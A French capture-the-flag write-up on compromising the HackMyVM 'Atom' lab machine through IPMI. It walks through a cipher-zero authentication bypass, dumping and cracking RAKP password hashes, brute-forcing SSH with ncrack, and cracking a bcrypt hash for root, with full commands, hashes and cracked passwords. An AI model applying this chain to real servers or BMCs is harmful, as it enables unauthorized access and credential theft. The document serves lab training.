---
title: "Solution du CTF Atom de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

Atom est un CTF disponible sur HackMyVM.eu et créé par [cromiphi](https://hackmyvm.eu/profile/?user=cromiphi), un auteur prolifique de CTF (24 VMs sur le site).

C'était un CTF intéressant, car il met le focus sur un protocole méconnu.

### Utterly Difficult Probing

Quand on lance le scan de port initial on se demande si il n'y a pas un problème :

```console
$ sudo nmap -p- -T5 192.168.56.104
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.104
Host is up (0.00020s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 08:00:27:7B:5E:C8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.64 seconds
```

On relance le scan pour être sûr, surtout que certains CTF ont parfois la (mauvaise) idée de mettre un port knocker, mais là rien.

Les exploits touchant OpenSSH ne sont pas courants. Relancer le scan avec `--script vuln` permet de voir que le serveur est vulnérable à la RCE "regreSSHion" mais à la vue des exploits existants qui visent uniquement les systèmes 32 bits et nécessitent de leur passer l'adresse de base de la libc, on va éviter.

On part donc sur un scan de ports UDP. C'est lent. Surtout que la machine ne semble pas pressée de nous renvoyer ses réponses ICMP.

Par défaut Nmap envoie des datagrammes à une certaine vitesse et on peut accélérer les choses avec `--min-rate`.

Ensuite, il renvoie les paquets s'il n'a pas de retour après un certain temps. Ici, on est en local, on va donc réduire la charge avec `--max-retries`.

Ensuite, avec `-sV`, Nmap envoie des probes pour tester différents protocoles jusqu'à tomber sur le bon. C'est important ici, car les serveurs peuvent ignorer un message s'il n'est pas dans le format attendu et avec UDP, on n'aura aucun retour. Il n'en reste pas moins que ça fait beaucoup d'essais et on peut limiter ça avec `--version-light` qui ne va tester que 2 probes à chaque fois.

```console
$ sudo nmap -sU -sV --version-light --min-rate 1000 --max-retries 1 192.168.56.104
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.104
Host is up (0.00052s latency).
Not shown: 992 open|filtered udp ports (no-response)
PORT      STATE  SERVICE   VERSION
623/udp   open   asf-rmcp
826/udp   closed unknown
1035/udp  closed mxxrlogin
17468/udp closed unknown
17814/udp closed unknown
19660/udp closed unknown
33281/udp closed unknown
57172/udp closed unknown
MAC Address: 08:00:27:7B:5E:C8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 689.85 seconds
```

Il aura fallu presque 12 minutes pour faire ce scan, mais au moins, il y a un port ouvert.

On peut essayer d'en savoir plus :

```console
$ sudo nmap -sU -sCV -p 623 192.168.56.104
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.104
Host is up (0.00031s latency).

PORT    STATE SERVICE  VERSION
623/udp open  asf-rmcp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port623-UDP:V=7.95%I=7%D=5/23%Time=68309D92%P=x86_64-suse-linux-gnu%r(i
SF:pmi-rmcp,1E,"\x06\0\xff\x07\0\0\0\0\0\0\0\0\0\x10\x81\x1cc\x20\x008\0\x
SF:01\x97\x04\x03\0\0\0\0\t");
MAC Address: 08:00:27:7B:5E:C8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.58 seconds
```

Nmap n'a pas été très efficace sur ce coup, mais la réponse mentionne "ipmi-rmcp".

### Ipmiquoi ?

On trouve une page dédiée à ce protocole sur le bien aimé HackTricks :

[623/UDP/TCP - IPMI - HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/623-udp-ipmi.html)

C'est un peu comme SNMP mais ça descend à un niveau matériel. Ça communique avec le BMC (Baseboard Management Controller) intégré à la carte mère.

Il existe différents scripts Nmap pour ce protocole, je les retrouve sur mon système :

```
/usr/share/nmap/scripts/ipmi-brute.nse
/usr/share/nmap/scripts/ipmi-cipher-zero.nse
/usr/share/nmap/scripts/ipmi-version.nse
/usr/share/nmap/scripts/supermicro-ipmi-conf.nse
```

Par exemple pour obtenir la version :

```console
$ sudo nmap -sU -sC --script ipmi-version -p 623 192.168.56.104
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.104
Host is up (0.00047s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version: 
|   Version: 
|     IPMI-2.0
|   UserAuth: password, md5, md2, null
|   PassAuth: auth_msg, auth_user, non_null_user
|_  Level: 1.5, 2.0
MAC Address: 08:00:27:7B:5E:C8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
```

Ou pour voir si le serveur est vulnérable à une faille de bypass d'authentification :

```console
$ sudo nmap -sU -sC --script ipmi-cipher-zero -p 623 192.168.56.104
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.104
Host is up (0.00035s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-cipher-zero: 
|   VULNERABLE:
|   IPMI 2.0 RAKP Cipher Zero Authentication Bypass
|     State: VULNERABLE
|     Risk factor: High
|       
|       The issue is due to the vendor shipping their devices with the
|       cipher suite '0' (aka 'cipher zero') enabled. This allows a
|       remote attacker to authenticate to the IPMI interface using
|       an arbitrary password. The only information required is a valid
|       account, but most vendors ship with a default 'admin' account.
|       This would allow an attacker to have full control over the IPMI
|       functionality
|           
|     References:
|       http://fish2.com/ipmi/cipherzero.html
|_      https://www.us-cert.gov/ncas/alerts/TA13-207A
MAC Address: 08:00:27:7B:5E:C8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
```

En se basant sur la page d'HackTricks et le retour du script Nmap, on en déduit cette commande :

```console
$ ipmitool -H 192.168.56.104 -U admin -P yolo -C 0 -I lanplus user list
ID  Name             Callin  Link Auth  IPMI Msg   Channel Priv Limit
1                    true    false      false      Unknown (0x00)
2   admin            true    false      true       ADMINISTRATOR
3   analiese         true    false      true       USER
4   briella          true    false      true       USER
5   richardson       true    false      true       USER
6   carsten          true    false      true       USER
7   sibylle          true    false      true       USER
8   wai-ching        true    false      true       USER
9   jerrilee         true    false      true       USER
10  glynn            true    false      true       USER
11  asia             true    false      true       USER
12  zaylen           true    false      true       USER
13  fabien           true    false      true       USER
14  merola           true    false      true       USER
15  jem              true    false      true       USER
16  riyaz            true    false      true       USER
17  laten            true    false      true       USER
18  cati             true    false      true       USER
19  rozalia          true    false      true       USER
20  palmer           true    false      true       USER
21  onida            true    false      true       USER
22  terra            true    false      true       USER
23  ranga            true    false      true       USER
24  harrie           true    false      true       USER
25  pauly            true    false      true       USER
26  els              true    false      true       USER
27  bqb              true    false      true       USER
28  karlotte         true    false      true       USER
29  zali             true    false      true       USER
30  ende             true    false      true       USER
31  stacey           true    false      true       USER
32  shirin           true    false      true       USER
33  kaki             true    false      true       USER
34  saman            true    false      true       USER
35  kalie            true    false      true       USER
36  deshawn          true    false      true       USER
37  mayeul           true    false      true       USER
38                   true    false      false      Unknown (0x00)
39                   true    false      false      Unknown (0x00)
40                   true    false      false      Unknown (0x00)
41                   true    false      false      Unknown (0x00)
42                   true    false      false      Unknown (0x00)
43                   true    false      false      Unknown (0x00)
44                   true    false      false      Unknown (0x00)
45                   true    false      false      Unknown (0x00)
46                   true    false      false      Unknown (0x00)
47                   true    false      false      Unknown (0x00)
48                   true    false      false      Unknown (0x00)
49                   true    false      false      Unknown (0x00)
50                   true    false      false      Unknown (0x00)
51                   true    false      false      Unknown (0x00)
52                   true    false      false      Unknown (0x00)
53                   true    false      false      Unknown (0x00)
54                   true    false      false      Unknown (0x00)
55                   true    false      false      Unknown (0x00)
56                   true    false      false      Unknown (0x00)
57                   true    false      false      Unknown (0x00)
58                   true    false      false      Unknown (0x00)
59                   true    false      false      Unknown (0x00)
60                   true    false      false      Unknown (0x00)
61                   true    false      false      Unknown (0x00)
62                   true    false      false      Unknown (0x00)
63                   true    false      false      Unknown (0x00)
```

Ici `lanplus` est un paramètre spécifique à IPMI, ce n'est pas le nom de mon périphérique réseau.

J'ai tenté de brute-forcer les comptes sur le SSH mais ça allait prendre une éternité alors, j'ai abandonné.

### Ta mère elle va dumper

J'ai trouvé cet article de Rapid7 qui indique que l'on peut dumper les hash des utilisateurs pour les casser :

[A Penetration Tester's Guide to IPMI and BMCs | Rapid7 Blog](https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/)

N'ayant pas envie de lancer Kali + Metasploit, j'ai fouillé sur Github et j'ai trouvé ce script Python :

[GitHub - c0rnf13ld/ipmiPwner: Exploit to dump ipmi hashes](https://github.com/c0rnf13ld/ipmiPwner)

Pour qu'il dumpe les hashs de tous les utilisateurs il faut au préalable retirer les lignes `if valid: break` dans le script.

```console
$ python ipmipwner.py -uW ipmi_users.txt --host 192.168.56.104
[*] Checking if port 623 for host 192.168.56.104 is active
[*] Brute Forcing
[*] Reading the file by chunks
[*] Reading Bytes: 241/241
[*] Number of retries: 2
[*] The username: admin is valid                                                  
[*] The hash for user: admin
   \_ $rakp$a4a3a2a082820000e340f72310a9b278aa67bd0fe3347b2207de3d91fec2fe4b24bb323a2228916aa123456789abcdefa123456789abcdef140561646d696e$3bc90a797d6405fc5ef9ca18fbbfb3031a22a25b
[*] The username: analiese is valid                                                  
[*] The hash for user: analiese
   \_ $rakp$a4a3a2a00483000008e5f97b4314b56c205a49029e032273fc6c18d10151dc6cd1ffc8a1c95a9fc8a123456789abcdefa123456789abcdef1408616e616c69657365$00bb5c695a847996c7c62e90d62bf7762f928d01
[*] The username: briella is valid                                                  
[*] The hash for user: briella
   \_ $rakp$a4a3a2a086830000d13b1a774e098e15ea2c1f348d0d5ce359e737d963acb49c7f4a95eec0e9697aa123456789abcdefa123456789abcdef1407627269656c6c61$c5fc3728771ec70e9afc759b84e4e7295ae6b873
[*] The username: richardson is valid                                                  
[*] The hash for user: richardson
   \_ $rakp$a4a3a2a008840000d546945f2cba6c9670807f050815ae03afb3fc0a543a0bbd21b223d7ec2a5ab6a123456789abcdefa123456789abcdef140a72696368617264736f6e$15ef505a27de6751606091f72f4daa6435ec90ec
[*] The username: carsten is valid                                                  
[*] The hash for user: carsten
   \_ $rakp$a4a3a2a082840000df5a9577ea142767c7e0be2f83fffbd1bd4c4a80e02f891ec7e6385af0f9fb20a123456789abcdefa123456789abcdef14076361727374656e$c4eed13373a6917c269308a70aa393de4fb0f40b
[*] The username: sibylle is valid                                                  
[*] The hash for user: sibylle
   \_ $rakp$a4a3a2a0048500004e43364a3ab0aa8c52ad109adf81075a78471498f2c9e3394527a0d7fb1f9ae2a123456789abcdefa123456789abcdef1407736962796c6c65$d389a1b3e72fc9cc315c16da48987b961f8d5f39
[*] The username: wai-ching is valid                                                  
[*] The hash for user: wai-ching
   \_ $rakp$a4a3a2a086850000905b57d01d09d3ffcb90f0b8fff841d1f98254e8073d6eac7ad3bc92db5eb39ca123456789abcdefa123456789abcdef14097761692d6368696e67$a3263565a101a1781f1e4ff613b14c3aa276d490
[*] The username: jerrilee is valid                                                  
[*] The hash for user: jerrilee
   \_ $rakp$a4a3a2a0028600007e2e2b251050db698eb7711f26c1d4a139011c69badce70b8220ebaccc4b5771a123456789abcdefa123456789abcdef14086a657272696c6565$a622aae0992e2a8d78ccf23bb4270f34fce16c92
[*] The username: glynn is valid                                                  
[*] The hash for user: glynn
   \_ $rakp$a4a3a2a084860000b3682ad2f0deb0a0b341c5598314a65f1b9b53d7ccbdd12572230b0f43138c30a123456789abcdefa123456789abcdef1405676c796e6e$882ca6661dfb1b4fc571e2426ec5edc9e68129ab
[*] The username: asia is valid                                                  
[*] The hash for user: asia
   \_ $rakp$a4a3a2a006870000c4910cd9690be2a2211c8b5b0c0450e8945658b5b88ef8b9537e38f6a90ad73ea123456789abcdefa123456789abcdef140461736961$ffc09eafa9179aab91f067ad523a36a403cbc802
[*] The username: zaylen is valid                                                  
[*] The hash for user: zaylen
   \_ $rakp$a4a3a2a0828700007a4a01353f9edc2b87952565181e9f04afef09f7d64b903ce6177b0d3b225316a123456789abcdefa123456789abcdef14067a61796c656e$e6889782d423f0aea596d2aefa4882b1873ae6d8
[*] The username: fabien is valid                                                  
[*] The hash for user: fabien
   \_ $rakp$a4a3a2a004880000275a65b1a3522f3ca2818028a793b7dcaf6fb90561d123820564ba341a98981ba123456789abcdefa123456789abcdef140666616269656e$29886783287de29f312f928b5bb3ee7d1c12254c
[*] The username: merola is valid                                                  
[*] The hash for user: merola
   \_ $rakp$a4a3a2a08688000034d92beb0c6ef5871c505b9b31dc7bed8d9e4d744cc4c5a3dea1052fcc90ed28a123456789abcdefa123456789abcdef14066d65726f6c61$161fdbc6bf67d0f2b156cfeba558d992e469f57a
[*] The username: jem is valid                                                  
[*] The hash for user: jem
   \_ $rakp$a4a3a2a008890000bc4befffecf2cb8e797074565d0867d509ac7347eb8d251a01adba9ecc9340f1a123456789abcdefa123456789abcdef14036a656d$e9a7e3356e58e8ea1a9d0f1b66a18faf4413d19d
[*] The username: riyaz is valid                                                  
[*] The hash for user: riyaz
   \_ $rakp$a4a3a2a08289000079e5fa0a4bb0bae9adb3d06a525d64944de2df374644e7290ad275fef7e91f90a123456789abcdefa123456789abcdef1405726979617a$02f151e057467d485594de7eaa32575c47c128ea
[*] The username: laten is valid                                                  
[*] The hash for user: laten
   \_ $rakp$a4a3a2a0048a00000f5607c56852a2a1dd86fe41ca5d58d6db55e93fae24f381b7c28d9876f922ffa123456789abcdefa123456789abcdef14056c6174656e$04189cd08c0587f815ba213613f602bb2a9dd855
[*] The username: cati is valid                                                  
[*] The hash for user: cati
   \_ $rakp$a4a3a2a0868a000071eb6317759bf771a0f2e0124fde86c19f2354b18212932ccbb303255c06e698a123456789abcdefa123456789abcdef140463617469$91caf389d479c1b9364c73c135ae33dcc77b1ced
[*] The username: rozalia is valid                                                  
[*] The hash for user: rozalia
   \_ $rakp$a4a3a2a0088b0000624a8aaec9f9fbe6e797ec12a9d9983e346f08d5ac83e6d9f6a8a6afc3e6bdefa123456789abcdefa123456789abcdef1407726f7a616c6961$0a3ba8a4f3b16ee3e06e03cb5d3bedcb081b6c11
[*] The username: palmer is valid                                                  
[*] The hash for user: palmer
   \_ $rakp$a4a3a2a0828b0000d77b5c68f1d9312c3d6625a994b824dc8c0926943a225a74755691e406e2a38aa123456789abcdefa123456789abcdef140670616c6d6572$4654283d6b90231406f1312d7ca862998351a58d
[*] The username: onida is valid                                                  
[*] The hash for user: onida
   \_ $rakp$a4a3a2a0048c00000050ca84840e5d4f0b023dd566033a5d7c41f02c4fdacfee017b3570c587eb34a123456789abcdefa123456789abcdef14056f6e696461$39bef933cc5b0e44cf756efac2e2da4b0faff55e
[*] The username: terra is valid                                                  
[*] The hash for user: terra
   \_ $rakp$a4a3a2a0868c0000e0502917c0773a7a07e47ec59ca07cbaf5f0f47ef17c4c7536cbdc813e500130a123456789abcdefa123456789abcdef14057465727261$2e86a164fbdc7dc3528317052c5d6cf9bdb481c2
[*] The username: ranga is valid                                                  
[*] The hash for user: ranga
   \_ $rakp$a4a3a2a0028d00003cdd5c75a188cb89741f5145b8311a1b9f968b0a8ef3ac626aa351be5728a71ca123456789abcdefa123456789abcdef140572616e6761$f76d5cb2a7b8760c7cd4e40e53c3120bb200fa45
[*] The username: harrie is valid                                                  
[*] The hash for user: harrie
   \_ $rakp$a4a3a2a0848d00005f261630157b7e22fd292e3fedd883a3455cf676b884f3e5de40186cf4e9cc25a123456789abcdefa123456789abcdef1406686172726965$6cec311df7741ce468b9b4cde7448c972c2f775a
[*] The username: pauly is valid                                                  
[*] The hash for user: pauly
   \_ $rakp$a4a3a2a0068e000053901c89b73c33aae53498a3e3d4dbef816638b05f0560ee80b669db89a62698a123456789abcdefa123456789abcdef14057061756c79$a9310e3424e265ca50b337e77207756e494a8195
[*] The username: els is valid                                                  
[*] The hash for user: els
   \_ $rakp$a4a3a2a0828e00004d2012e211e835433b80dbabaca7960ffbc553f103a149fa790787fb699220fda123456789abcdefa123456789abcdef1403656c73$8211b2dc7dfe66952cfe7ed31f7d4e5522333a76
[*] The username: bqb is valid                                                  
[*] The hash for user: bqb
   \_ $rakp$a4a3a2a0048f00007737c33f09f823a5265c24a1f199ebd48f7de617f0649d58b948a59c8cdf9c5fa123456789abcdefa123456789abcdef1403627162$3d2571ef9a4fae436a2bd9425ef7b200122b0f49
[*] The username: karlotte is valid                                                  
[*] The hash for user: karlotte
   \_ $rakp$a4a3a2a0868f00000c9a319d05caae785fd40a840f1d02f7694351caa295b5d82e761e2e2cae4360a123456789abcdefa123456789abcdef14086b61726c6f747465$57503f9276dd9f339380ca83f27ec49169b73853
[*] The username: zali is valid                                                  
[*] The hash for user: zali
   \_ $rakp$a4a3a2a00290000099ba1c15aebdb2f72309c7fdae0f15777a6748f892af2fc0d03a4a3e46ab55ada123456789abcdefa123456789abcdef14047a616c69$9e454b9c3b52538c4294894102456e8bb7a8e549
[*] The username: ende is valid                                                  
[*] The hash for user: ende
   \_ $rakp$a4a3a2a084900000400bf6805db92a81315914383260e21be361c16cb217d5ea4fb103144e50d1fda123456789abcdefa123456789abcdef1404656e6465$8803e9d7ea2eadb61b91f55da24cf25bff8c5a0b
[*] The username: stacey is valid                                                  
[*] The hash for user: stacey
   \_ $rakp$a4a3a2a0069100006a158529acd67508f07ee1baf4f3047405713748d1f3c96fce750ddaed53d97ca123456789abcdefa123456789abcdef1406737461636579$20e16845a38ba75515c04c04b4fe60b307b27771
[*] The username: shirin is valid                                                  
[*] The hash for user: shirin
   \_ $rakp$a4a3a2a08891000097ed4ba598475e3c8635ddbbebf381ab96cf1402bb848e04a7803083b460d628a123456789abcdefa123456789abcdef140673686972696e$1f90925afbe2207117d0c46e0e48ac55dc3e3498
[*] The username: kaki is valid                                                  
[*] The hash for user: kaki
   \_ $rakp$a4a3a2a0029200004b297fa2f00a2f22af93271df209ece9e378caa3b31c8fec56f2ba4641230561a123456789abcdefa123456789abcdef14046b616b69$1cb6e5d353ae4c50618f7e308c4f216f65f8bc60
[*] The username: saman is valid                                                  
[*] The hash for user: saman
   \_ $rakp$a4a3a2a0849200003f319c3c775b90141e0487127ed2e4d4ed0d4816098c08a89262728d8af792a3a123456789abcdefa123456789abcdef140573616d616e$fe0532e93bdb6b9cbe427e480bb5bef3682a6091
[*] The username: kalie is valid                                                  
[*] The hash for user: kalie
   \_ $rakp$a4a3a2a00693000011ace79a2fc57ba26690d2aa0d98566e0883c34baeb6cc235c75b0e7711bbc37a123456789abcdefa123456789abcdef14056b616c6965$5cd9ca47b453b6500ccc7c6c142cf2170e7185b5
[*] The username: deshawn is valid                                                  
[*] The hash for user: deshawn
   \_ $rakp$a4a3a2a0829300008973c875d1aebccca50185e2686f315ecc3b39fc722a47f368d85be951b49fa9a123456789abcdefa123456789abcdef14076465736861776e$7128aebec58fc88f52384078d7b9c7b8cc8e44f4
[*] The username: mayeul is valid                                                  
[*] The hash for user: mayeul
   \_ $rakp$a4a3a2a004940000cfee0f153cafa0e8f202d443e3e17024653d77679d4094e5c13fd819ef7931caa123456789abcdefa123456789abcdef14066d617965756c$bb5934d0fa2e0122a09f5c52ad03fc65ece5017c
```

### Ta mère elle a cracké

```console
$ john --wordlist=rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 36 password hashes with 36 different salts (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
honda            (?)     
jesus06          (?)     
darell           (?)     
2468             (?)     
me4life          (?)     
evan             (?)     
TWEETY1          (?)     
120691           (?)     
081704           (?)     
122987           (?)     
batman!          (?)     
phones           (?)     
jiggaman         (?)     
sexymoma         (?)     
071590           (?)     
515253           (?)     
290992           (?)     
emeralds         (?)     
tripod           (?)     
castillo1        (?)     
numberone        (?)     
090506           (?)     
billandben       (?)     
milo123          (?)     
10101979         (?)     
number17         (?)     
chatroom         (?)     
mackenzie2       (?)     
djones           (?)     
trick1           (?)     
jaffa1           (?)     
dezzy            (?)     
poynter          (?)     
kittyboo         (?)     
241107           (?)     
cukorborso       (?)     
36g 0:00:00:01 DONE (2025-05-24 10:12) 19.57g/s 4843Kp/s 6482Kc/s 6482KC/s d704914..crompingtons
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Avec tous ces mots de passe, on peut passer à Ncrack. Je m'y ferais jamais qu'il faille `-v` pour afficher les passwords trouvés en temps réel.

```console
$ ncrack -U ipmi_users.txt -P pass.txt ssh://192.168.56.104

Starting Ncrack 0.8 ( http://ncrack.org ) at 2025-05-24 10:15 CEST
Discovered credentials for ssh on 192.168.56.104 22/tcp:
192.168.56.104 22/tcp ssh: 'onida' 'jiggaman'

Ncrack done: 1 service scanned in 429.03 seconds.

Ncrack finished.
```

Premier flag :

```console
onida@atom:~$ cat user.txt
f75390001fa2fe806b4e3f1e5dadeb2b
```

Après avoir cherché des défauts de permission et binaires setuid, j'ai remarqué la présence d'Apache dans les process :

```
root         443  0.0  0.7 205752 21876 ?        Ss   17:54   0:00 /usr/sbin/apache2 -k start
www-data     476  0.0  0.3 206328 11168 ?        S    17:54   0:00 /usr/sbin/apache2 -k start
www-data     477  0.0  0.3 206328 11168 ?        S    17:54   0:00 /usr/sbin/apache2 -k start
www-data     478  0.0  0.3 206328 11168 ?        S    17:54   0:00 /usr/sbin/apache2 -k start
www-data     479  0.0  0.3 206328 11168 ?        S    17:54   0:00 /usr/sbin/apache2 -k start
www-data     480  0.0  0.3 206328 11168 ?        S    17:54   0:00 /usr/sbin/apache2 -k start
```

Étonnant vu que le port 80 est inaccessible. Il y a une base de données dans la racine web :

```console
onida@atom:/var/www/html$ ls -al
total 172
drwxr-xr-x 6 www-data www-data   4096 May 27  2024 .
drwxr-xr-x 3 root     root       4096 May 25  2024 ..
-rwxr-xr-x 1 www-data www-data 114688 May 27  2024 atom-2400-database.db
drwxr-xr-x 2 www-data www-data   4096 Dec 31  2400 css
drwxr-xr-x 4 www-data www-data   4096 Dec 31  2400 img
-rw-r--r-- 1 www-data www-data  11767 Dec 31  2400 index.php
drwxr-xr-x 2 www-data www-data   4096 Dec 31  2400 js
-rw-r--r-- 1 www-data www-data   6262 Dec 31  2400 login.php
-rwxr-xr-x 1 www-data www-data   1637 Dec 31  2400 profile.php
-rw-r--r-- 1 www-data www-data   5534 Dec 31  2400 register.php
drwxr-xr-x 2 www-data www-data   4096 Dec 31  2400 video
onida@atom:/var/www/html$ file atom-2400-database.db 
atom-2400-database.db: SQLite 3.x database, last written using SQLite version 3040001, file counter 4373, database pages 28, 1st free page 5, free pages 24, cookie 0x3, schema 4, UTF-8, version-valid-for 4373
onida@atom:/var/www/html$ sqlite3 atom-2400-database.db 
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
login_attempts  users         
sqlite> select * from users;
1|atom|$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm
```

Je récupère le hash, je le préfixe par `atom:` puis j'ajoute 7 fois le caractère `:` après le hash histoire que JtR soit content.

```console
$ john --wordlist=rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Note: Passwords longer than 24 [worst case UTF-8] to 72 [ASCII] truncated (property of the hash)
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
madison          (atom)     
1g 0:00:00:03 DONE (2025-05-24 10:33) 0.3279g/s 70.82p/s 70.82c/s 70.82C/s manuel..jessie
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Cette fois on tient notre root :

```console
onida@atom:/var/www/html$ su root
Password: 
root@atom:/var/www/html# cd
root@atom:~# ls
root.txt
root@atom:~# cat root.txt 
d3a4fd660f1af5a7e3c2f17314f4a962
```
